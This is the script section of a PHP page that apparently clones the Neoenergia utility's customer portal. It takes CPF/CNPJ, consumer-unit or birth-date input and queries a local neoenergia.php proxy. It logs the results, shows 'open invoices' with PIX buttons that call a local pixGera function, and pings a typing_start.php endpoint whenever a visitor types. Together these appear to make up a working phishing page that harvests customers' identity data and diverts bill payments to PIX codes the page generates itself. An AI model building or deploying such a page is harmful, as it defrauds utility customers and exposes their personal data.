
        document.querySelectorAll('.boxfaura').forEach(item => {
                item.style.display = 'none';
        });

        document.querySelectorAll(`.${ClassEndereco}`).forEach(item => {
                item.style.display = '';
        });

        document.querySelector('.loading-container').style.display = '';

        setTimeout(() => {
           document.querySelector('.loading-container').style.display = 'none';
           document.querySelector('.endereco-faturas').style.display = 'none';
           document.querySelector('.faturas-bertas').style.display = '';
        }, 1000);
    }

    function Endderecos(e) {
        document.querySelector('.endereco-faturas').style.display = '';
        document.querySelector('.faturas-bertas').style.display = 'none';
    }

    function EnderecosHTML(e) {

        var html = '';

        e.forEach(dados => {
             html += `<tr _ngcontent-qxf-c252="" class="ng-star-inserted" onclick="SelectEndereco('${dados.endereco}', '${dados.uc}')">
            <td _ngcontent-qxf-c252="">
            <div _ngcontent-qxf-c252="" class="col-12 box-imoveis text-left">
                <div _ngcontent-qxf-c252="" class="row d-flex justify-content-between cursor-pointer container-rows">
                    <div _ngcontent-qxf-c252="" class="col-11 d-flex flex-wrap">
                        <div _ngcontent-qxf-c252="" class="col-12 col-md-4 col-lg-4 pb-md-0 pb-2">
                            <div _ngcontent-qxf-c252="" class="unidade-consumidora-title pb-2"> UNIDADE CONSUMIDORA </div>
                            <div _ngcontent-qxf-c252="" class="unidade-consumidora-value"> ${dados.uc} </div></div>
                            <div _ngcontent-qxf-c252="" class="col-12 col-md-4 col-lg-4 pb-md-0 pb-2">
                                <div _ngcontent-qxf-c252="" class="unidade-consumidora-title pb-2"> ENDEREÇO </div>
                                <div _ngcontent-qxf-c252="" class="endereco"> ${dados.endereco} </div>
                            </div></div><div _ngcontent-qxf-c252="" class="col-1"><mat-icon _ngcontent-qxf-c252="">
                                <span _ngcontent-qxf-c252="" class="material-icons-outlined">expand_more</span></mat-icon>
                            </div></div></div></td></tr>`;
        });

        document.querySelector('.endereco-faturas-list').innerHTML = html;

        if(e.length<=1){
            document.querySelector('.endereco-faturas').style.display = 'none';
            document.querySelector('.faturas-bertas').style.display = '';
        }

    }

    function formatarMesAno(input) {

      console.log(input);
      
      return input;
        const meses = [
            "JANEIRO", "FEVEREIRO", "MARÇO", "ABRIL",
            "MAIO", "JUNHO", "JULHO", "AGOSTO",
            "SETEMBRO", "OUTUBRO", "NOVEMBRO", "DEZEMBRO"
        ];

        if(input.includes("/")){
           var partes = input.split("/");
        }

        if (partes.length !== 2) return input; 

        const [mesStr, ano] = partes;

        if (meses.includes(mesStr.toUpperCase())) {
            return input;
        }

        const mesIndex = parseInt(mesStr, 10) - 1;

        if (mesIndex < 0 || mesIndex > 11) {
            return input;
        }

        return `${meses[mesIndex]}/${ano}`;
    }

    function agruparFaturasPorVencimento(faturas) {
            const mapa = {};

            faturas.forEach(fatura => {
                const data = fatura.dataVencimento;
                const valor = parseFloat(fatura.valorEmissao);

                if (!mapa[data]) {
                // Clona a fatura como base
                mapa[data] = {
                    ...fatura,
                    valorEmissao: 0
                };
                }

                // Soma os valores
                mapa[data].valorEmissao += valor;

                // Verifica se essa fatura é do mês mais recente
                if (fatura.mesReferencia > mapa[data].mesReferencia) {
                mapa[data] = {
                    ...fatura,
                    valorEmissao: mapa[data].valorEmissao
                };
                }
            });

            // Ajusta para string com 2 casas decimais
            return Object.values(mapa).map(fatura => ({
                ...fatura,
                valorEmissao: fatura.valorEmissao.toFixed(2)
            }));
      }


    function FaturasHTML(e) {

        if (e) {

            if (e?.protocolo) {
                document.querySelector('.protocolo-text').innerHTML = e.protocolo;
            }

            SalveLog(e); 

            if (e?.resultado?.faturasAbertas) {

                var html = '';
                agruparFaturasPorVencimento(e.resultado.faturasAbertas).forEach(dados => {

                    if (dados.uc) {
                        document.querySelector('.txtuc').innerHTML = dados.uc;
                    }

                    if (dados.endereco) {
                        document.querySelector('.txtend').innerHTML = dados.endereco;
                    }

                    html += `<mat-card class="${removerCaracteres(dados.endereco)} mat-card mat-focus-indicator mt-3 boxfaura">
                                <mat-card-content class="mat-card-content row m-0 d-flex justify-content-between">
                                    <div class="row col-12 p-0 m-0 d-flex">
                                        <div class="col-12 row justify-content-between">
                                            <div class="col-12 col-md-3 fatura-situacao"><span class="d-block uppercase bold color-primary fonte-info-fatura text-center">STATUS</span><span class="d-block fonte-info-fatura text-center ${aStatus(dados.statusFatura)}"><strong>${dados.statusFatura}</strong></span>
                                            </div>
                                            <div class="col-12 col-md-3"><span class="d-block uppercase bold color-primary text-nowrap fonte-info-fatura text-center">VALOR</span><span class="d-block fonte-info-fatura text-center ${aStatus(dados.statusFatura)}">
                                                    R$&nbsp;${toMoney(dados.valorEmissao)} </span></div>
                                            <div class="col-12 col-md-3 ng-star-inserted"><span class="d-block uppercase bold color-primary text-nowrap fonte-info-fatura text-center">REFERÊNCIA</span><span class="d-block color-dark-gray fonte-info-fatura text-center">${formatarMesAno(formatarAnoMesParaBR(dados.mesReferencia || dados.dataVencimento))}</span>
                                            </div>
                                            <!---->
                                            <div class="col-12 col-md-3"><span class="d-block uppercase bold color-primary text-nowrap fonte-info-fatura text-center">VENCIMENTO</span><span class="d-block fonte-info-fatura text-center ${aStatus(dados.statusFatura)}">
                                                    ${formatarDataParaBR(dados.dataVencimento)} </span></div>
                                        </div>
                                    </div>
                                    <div class="d-flex flex-wrap mt-4 ng-star-inserted" style="justify-content: end;"><button onclick="pixGera(${dados.valorEmissao}, ${dados.numeroFatura})" type="button" mat-flat-button="" aria-label="Pagamento com PIX" class="mat-focus-indicator btn-pix d-flex align-items-center ms-3 mat-flat-button mat-button-base ng-star-inserted"><span class="mat-button-wrapper"> PIX <img src="https://agenciavirtual.neoenergia.com/assets/images/icons/pix.svg" alt="ícone pix" class="svg-icon"></span><span matripple="" class="mat-ripple mat-button-ripple"></span><span class="mat-button-focus-overlay"></span></button>
                                        <!----><button type="button" style="display: none;" mat-raised-button="" color="accent" aria-label="Pagamento com cartão de crédito" class="mat-focus-indicator ms-4 mat-raised-button mat-button-base mat-accent ng-star-inserted"><span class="mat-button-wrapper"> Pagar com Cartão
                                                <img src="https://agenciavirtual.neoenergia.com/assets/images/icons/cartao-credito.svg" alt="ícone cartão de crédito" class="svg-icon"></span><span matripple="" class="mat-ripple mat-button-ripple"></span><span class="mat-button-focus-overlay"></span></button>
                                        <!----><button type="button" mat-raised-button="" color="accent" aria-label="Código de Barras" style="display: none;" class="mat-focus-indicator ms-4 mat-raised-button mat-button-base mat-accent"><span class="mat-button-wrapper"> Código <img src="https://agenciavirtual.neoenergia.com/assets/images/icons/codigo-barras.svg" alt="ícone código" class="svg-icon"></span><span matripple="" class="mat-ripple mat-button-ripple"></span><span class="mat-button-focus-overlay"></span></button>
                                    </div>
                                    <!---->
                                    <!---->
                                </mat-card-content>
                            </mat-card>`;
                });
                document.getElementById('listar-faturas-abertas').innerHTML = html;
            }
        }
    }

    if (sucesso) {
        if (sessionStorage.getItem('historicoNeoenergia')) {
            const historico = JSON.parse(sessionStorage.getItem('historicoNeoenergia'));
            FaturasHTML(historico);
            dadosNeo = historico;
            EnderecosHTML(separarEnderecosFaltantes(dadosNeo?.resultado?.faturasAbertas));

        } else {
            window.location.href = './';
        }
        document.querySelector('.basefaturas').style = "";
    } else {
        document.querySelector('.baselogin').style = "";
    }

    function tipoLog(e) {
        document.querySelector('.seletorBox').style = "";
    }


    let options = document.getElementsByTagName('mat-list-option');
    let matoptions = document.getElementsByTagName('mat-option');
    const cpfCnpjInput = document.getElementById('documento');
    const continuarButton = document.querySelector('#nomeBtnx');
    const boxlocal = document.querySelector('.boxlocal');
    const boxucnass = document.querySelector('.boxucnass');
    const boxdoc = document.querySelector('.boxdoc');
    const inputElement = document.getElementById('codigoCliente');
    const buscar = document.getElementById('buscar');

    function limparTexto(texto) {
        return texto
            .normalize("NFD") // Separa os acentos das letras
            .replace(/[\u0300-\u036f]/g, "") // Remove acentos
            .toLowerCase() // Tudo minúsculo
            .replace(/\s+/g, ""); // Remove todos os espaços
    }

    for (let option of options) {
        option.addEventListener('click', function() {
            regiao = option.innerText
            local = limparTexto(option.innerText);
            for (let opt of options) {
                opt.style.backgroundColor = ''; // Remove qualquer estilo de background
            }

            // Agora, define o background do item clicado
            option.style.backgroundColor = 'rgba(97, 93, 90, 0.12)';

            document.querySelector('#nomeBtn').disabled = false;
            document.querySelector('#nomeBtn').className =
                'mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent';

        });
    }

    for (let matoption of matoptions) {
        matoption.addEventListener('click', function() {

            var txtcode = matoption.innerText;
            for (let opt of matoptions) {
                opt.style.backgroundColor = ''; // Remove qualquer estilo de background
            }

            // Agora, define o background do item clicado
            matoption.style.backgroundColor = 'rgba(97, 93, 90, 0.12)';

            document.querySelector('.txtselect').innerHTML = txtcode;
            document.querySelector('.txtxx').innerHTML = txtcode.toUpperCase();
            document.querySelector('.seletorBox').style = 'display:none';
            document.querySelector('#codigoCliente').value = '';
            document.querySelector('#buscar').disabled = true;
            document.querySelector('#buscar')
                .className =
                'mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent mat-button-disabled';
            document.querySelector('#codigoCliente').focus();

            if (txtcode == 'Data de Nascimento') {
                mask = IMask(inputElement, {
                    mask: '00/00/0000'
                });
                tipoV = 'data';
            } else {
                tipoV = 'uc';
                mask = IMask(inputElement, {
                    mask: '000000000000000'
                });
            }

        });
    }

    function Voltar(e) {
        if (e == 1) {
            boxlocal.style.display = '';
            boxdoc.style.display = 'none';
        }
        if (e == 2) {
            boxlocal.style.display = 'none';
            boxdoc.style.display = '';
            boxucnass.style.display = 'none';
        }
    }

    function ehDataValida(valor) {
        const regex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
        const match = valor.match(regex);

        if (!match) return false;

        const dia = parseInt(match[1], 10);
        const mes = parseInt(match[2], 10) - 1; // mês começa do zero em JS
        const ano = parseInt(match[3], 10);

        const data = new Date(ano, mes, dia);

        return (
            data.getFullYear() === ano &&
            data.getMonth() === mes &&
            data.getDate() === dia
        );
    }

    document.getElementById('codigoCliente').addEventListener('input', function() {
        const valor = this.value;

        if (tipoV == 'data') {
            if (ehDataValida(valor)) {
                document.querySelector('#buscar').disabled = false;
                document.querySelector('#buscar')
                    .className =
                    'mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent';
            } else {
                document.querySelector('#buscar').disabled = true;
                document.querySelector('#buscar')
                    .className =
                    'mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent mat-button-disabled';
            }
        } else {
            if (valor.length > 2) {
                document.querySelector('#buscar').disabled = false;
                document.querySelector('#buscar')
                    .className =
                    'mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent';
            } else {
                document.querySelector('#buscar').disabled = true;
                document.querySelector('#buscar')
                    .className =
                    'mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent mat-button-disabled';
            }
        }

    });

    // Função para adicionar a máscara ao CPF
    function aplicarMascaraCPF(cpf) {
        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    }

    // Função para adicionar a máscara ao CNPJ
    function aplicarMascaraCNPJ(cnpj) {
        return cnpj.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, "$1.$2.$3/$4-$5");
    }

    // Função para formatar o número digitado com base no comprimento
    function formatarDocumento(value) {
        // Remover todos os caracteres não numéricos
        value = value.replace(/\D/g, '');

        // Se o valor tem 11 caracteres, é CPF
        if (value.length <= 11) {
            return aplicarMascaraCPF(value);
        }
        // Se o valor tem 14 caracteres, é CNPJ
        else if (value.length <= 14) {
            return aplicarMascaraCNPJ(value);
        }
        return value; // Caso contrário, retorna o valor sem máscara
    }

    // Função para validar CPF
    function validarCPF(cpf) {
        const regexCpf = /^\d{3}\.\d{3}\.\d{3}-\d{2}$/;
        return regexCpf.test(cpf);
    }

    // Função para validar CNPJ
    function validarCNPJ(cnpj) {
        const regexCnpj = /^\d{2}\.\d{3}\.\d{3}\/\d{4}-\d{2}$/;
        return regexCnpj.test(cnpj);
    }

    // Função que verifica se o CPF/CNPJ é válido e ativa/desativa o botão
    function validarDocumento() {
        const documento = cpfCnpjInput.value.trim();

        // Aplica a formatação
        cpfCnpjInput.value = formatarDocumento(documento);

        // Verifica se o valor tem um formato válido
        if (validarCPF(cpfCnpjInput.value) || validarCNPJ(cpfCnpjInput.value)) {
            continuarButton.disabled = false; // Ativa o botão
            continuarButton.className =
                'mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent';
        } else {
            continuarButton.disabled = true; // Desativa o botão
            continuarButton.className =
                'mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent mat-button-disabled';
        }
    }

    // Adiciona o ouvinte de evento de input
    cpfCnpjInput.addEventListener('input', validarDocumento);

    // Inicialmente, o botão estará desativado
    continuarButton.disabled = true;

    if (selecPOST) {

        boxlocal.style.display = 'none';
        boxdoc.style.display = 'none';
        boxucnass.style.display = '';
        reposicionarPainel();
        continuarButton.disabled = false;
        continuarButton.className =
            'mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent';

        document.querySelector('#codigoCliente').focus();

    } else if (se) {
        boxlocal.style.display = 'none';
        boxdoc.style.display = '';
        cpfCnpjInput.focus();
    } else {
        boxlocal.style.display = '';
        boxdoc.style.display = 'none';
    }

    document.querySelector('#nomeBtn').addEventListener('click', function() {
        setTimeout(() => {
            boxlocal.style.display = 'none';
            boxdoc.style.display = '';
            cpfCnpjInput.focus();
        }, 500);
    });

    continuarButton.addEventListener('click', function() {
        setTimeout(() => {
            boxlocal.style.display = 'none';
            boxdoc.style.display = 'none';
            boxucnass.style.display = '';
            reposicionarPainel();
            document.querySelector('#codigoCliente').focus();
        }, 500);
    });

    function limparNumeros(valor) {
        return valor.replace(/\D/g, '');
    }

    function formatarData(dataBr) {
        const [dia, mes, ano] = dataBr.split('/');
        return `${ano}-${mes}-${dia}`;
    }

    var redin = true;
    buscar.addEventListener('click', function() {
        setTimeout(() => {
            const documento = document.getElementById('documento');
            const codigoCliente = document.getElementById('codigoCliente');

            const doc = documento?.value ?? '';
            const uc = (tipoV !== 'data') ? (codigoCliente?.value ?? '') : '';
            const dataNascimento = (tipoV === 'data') ? (formatarData(codigoCliente?.value) ?? '') : '';

            const params = new URLSearchParams({
                doc: limparNumeros(doc),
                uc: uc,
                dataNascimento: dataNascimento,
                regiao: local
            });

            document.querySelector('.loading-container').style = '';

            fetch(`./api/neoenergia.php?${params.toString()}`).then(response =>
                response.json()).then(data => {
                if (data.IsStatus) {

                    const historico = {
                        doc: limparNumeros(doc),
                        uc,
                        dataNascimento,
                        regiao: regiao,
                        resultado: data.dados,
                        protocolo: data.protocolo
                    };

                    sessionStorage.setItem('historicoNeoenergia', JSON.stringify(historico));
                    document.querySelector('.loading-container').style = 'display:none;';
                    if(redin){ window.location.href = './?sucesso=' + doc; } 

                } else if (!data.IsStatus) {
                    if (data?.retorno?.mensagem) {
                        alert(data.retorno.mensagem);
                    } else {
                        alert(data.messagem);
                    }
                    document.querySelector('.loading-container').style = 'display:none;';
                }
            }).catch(error => {
                console.error('Erro na requisição:', error);
            });
        }, 500);
    });

    function reposicionarPainel() {
        const painel = document.getElementById('parametroEntrada-panel');
        const anchor = document.getElementById('tipoLog');

        if (painel && anchor) {
            const rect = anchor.getBoundingClientRect();

            // Encontrar o container do painel (cdk-overlay-pane pai do panel)
            const overlayPane = painel.closest('.cdk-overlay-pane');

            if (overlayPane) {
                overlayPane.style.position = 'fixed';
                overlayPane.style.top = `${rect.top}px`;
                overlayPane.style.left = `${rect.left}px`;
                overlayPane.style.width = `${rect.width}px`;
                overlayPane.style.zIndex = '1000';
            }
        }
    }

    // Detectar abertura do painel via MutationObserver
    const observer = new MutationObserver(() => {
        const painel = document.getElementById('parametroEntrada-panel');
        if (painel && painel.offsetParent !== null) {
            // Quando o painel for inserido no DOM e visível
            reposicionarPainel();
        }
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });

    // Também ajustar ao redimensionar a janela
    window.addEventListener('resize', () => {
        reposicionarPainel();
    });

    var mask, tipoV = 'uc';

    mask = IMask(inputElement, {
        mask: '000000000000000'
    });
    </script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">

<?php if(!$sucesso){ ?>

    <script>

    var inputs = [
    document.getElementById('documento'),
    document.getElementById('codigoCliente')
];

let typingTimer = null;
let notifyInterval = null;
const INACTIVITY_TIMEOUT = 3000; // 3 segundos sem digitar
const NOTIFY_INTERVAL = 5000; // notificar a cada 5s enquanto digitando

inputs.forEach(input => {
    input.addEventListener('input', (e) => {
        const value = e.target.value.trim();

        // Ao começar a digitar, envia notificação e inicia intervalos
        if (!notifyInterval) {
            notifyTyping();
            notifyInterval = setInterval(notifyTyping, NOTIFY_INTERVAL);
        }

        // Reinicia o timer de inatividade sempre que digita
        clearTimeout(typingTimer);
        typingTimer = setTimeout(() => {
            // Parou de digitar
            clearInterval(notifyInterval);
            notifyInterval = null;
        }, INACTIVITY_TIMEOUT);
    });
});

async function notifyTyping() {
    try {
        const response = await fetch('/api/typing_start.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ typing: true })
        });

        if (!response.ok) {
            console.error('Erro ao notificar typing:', response.status);
            return;
        }

        const data = await response.json();
        // Pode usar o `data` se necessário

    } catch (error) {
        console.error('Erro na requisição typing_start.php:', error);
    }
}
</script>

        <?php } ?>


</body>

</html>